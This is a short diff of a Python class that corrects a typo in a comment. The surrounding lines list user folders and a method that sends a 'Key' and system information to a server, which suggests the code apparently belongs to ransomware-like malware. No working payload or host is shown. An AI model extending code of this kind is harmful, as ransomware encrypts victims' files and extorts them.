@@ -17,7 +17,7 @@ class MainClass:
         self.paths = ["Desktop","Documents","Downloads","Images","Videos"]
 
 
-    # Send Key & Systeminforamtions to Server
+    # Send Key & Systeminformations to Server
     def send_key(self):
         # Read System Informations
         system = sysinformation.ReadSystem()
